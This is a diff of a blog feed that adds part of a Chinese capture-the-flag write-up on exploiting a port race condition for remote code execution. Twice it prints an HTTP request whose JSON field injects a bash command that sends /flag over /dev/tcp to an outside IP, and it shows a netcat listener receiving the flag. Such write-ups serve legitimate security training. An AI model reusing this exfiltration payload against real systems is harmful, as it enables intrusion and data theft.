@@ -494,8 +494,70 @@
 &lt;/div>&lt;p>利用&lt;code>probe&lt;/code>把43个端口打乱，再接着逐个链接，成功之后传参即可RCE。&lt;/p>
 &lt;p>也就是说自己的TCP链接自己的，Race Condition即可&lt;/p>
 &lt;p>然而，端口的确定成了一个问题，我看到有这样的文章 &lt;a class="link" href="https://blog.chummydns.com/blogs/analysis_linux_host_by_tcp_timestamp/" target="_blank" rel="noopener"
->https://blog.chummydns.com/blogs/analysis_linux_host_by_tcp_timestamp/&lt;/a>&lt;/p>
-&lt;p>不知道代码怎么实现，他这里要开一个端口再自己去连，而且端口的地址还是靠内核来的&lt;/p></description></item><item><title>hxp38C3CTF</title><link>https://baozongwi.xyz/p/hxp38c3ctf/</link><pubDate>Thu, 27 Mar 2025 20:14:55 +0000</pubDate><guid>https://baozongwi.xyz/p/hxp38c3ctf/</guid><description>&lt;p>起环境的时候发现了这样的报错&lt;/p>
+>https://blog.chummydns.com/blogs/analysis_linux_host_by_tcp_timestamp/&lt;/a> 看着比实际其实复杂太多了&lt;strong>Chara&lt;/strong>师傅给我讲解了一下问题&lt;/p>
+&lt;blockquote>
+&lt;p>多个php运行的时候 可能一个php的tcp打开了44444发送了json，另一个php的tcp也刚好打开了44444发送了json&lt;/p>&lt;/blockquote>
+&lt;p>所以直接简单粗暴的就可以解决这个问题&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-http" data-lang="http">&lt;span class="line">&lt;span class="cl">&lt;span class="nf">GET&lt;/span> &lt;span class="nn">/?probe=§44444§&lt;/span> &lt;span class="kr">HTTP&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="m">1.1&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Host&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">156.239.238.207:8080&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="n">Connection&lt;/span>&lt;span class="o">:&lt;/span> &lt;span class="l">keep-aliave&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="g">{&amp;#34;signal&amp;#34;:&amp;#34;Arrival&amp;#34;,&amp;#34;logogram&amp;#34;:&amp;#34;system(\&amp;#34;bash -c &amp;#39;cat /flag &amp;gt;&amp;amp; /dev/tcp/156.238.233.93/4444 0&amp;gt;&amp;amp;1&amp;#39;\&amp;#34;);&amp;#34;}
+&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;img src="https://baozongwi.xyz/p/hitcon2025/1.png"
+width="1310"
+height="715"
+srcset="https://baozongwi.xyz/p/hitcon2025/1_hu_4701f88ac3d47040.png 480w, https://baozongwi.xyz/p/hitcon2025/1_hu_90bb85887113487b.png 1024w"
+loading="lazy"
+alt="1"
+class="gallery-image"
+data-flex-grow="183"
+data-flex-basis="439px"
+>&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">root@dkhkKySag1YyfK:~# nc -lvnp &lt;span class="m">4444&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Listening on 0.0.0.0 &lt;span class="m">4444&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connection received on 156.239.238.207 &lt;span class="m">48260&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">hitcon&lt;span class="o">{&lt;/span>123&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">root@dkhkKySag1YyfK:~#
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>当然了，既然是那个原理，所以我们直接一直打一个端口也能成功&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">GET /?probe&lt;span class="o">=&lt;/span>&lt;span class="m">44444&lt;/span> HTTP/1.1
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Host: 156.239.238.207:8080
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Connection: keep-aliave
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">{&lt;/span>&lt;span class="s2">&amp;#34;signal&amp;#34;&lt;/span>:&lt;span class="s2">&amp;#34;Arrival&amp;#34;&lt;/span>,&lt;span class="s2">&amp;#34;logogram&amp;#34;&lt;/span>:&lt;span class="s2">&amp;#34;system(\&amp;#34;bash -c &amp;#39;cat /flag &amp;gt;&amp;amp; /dev/tcp/156.238.233.93/4444 0&amp;gt;&amp;amp;1&amp;#39;\&amp;#34;);&amp;#34;&lt;/span>&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>然后打null payloads就可以&lt;/p></description></item><item><title>hxp38C3CTF</title><link>https://baozongwi.xyz/p/hxp38c3ctf/</link><pubDate>Thu, 27 Mar 2025 20:14:55 +0000</pubDate><guid>https://baozongwi.xyz/p/hxp38c3ctf/</guid><description>&lt;p>起环境的时候发现了这样的报错&lt;/p>
 &lt;div class="highlight">&lt;div class="chroma">
 &lt;table class="lntable">&lt;tr>&lt;td class="lntd">
 &lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
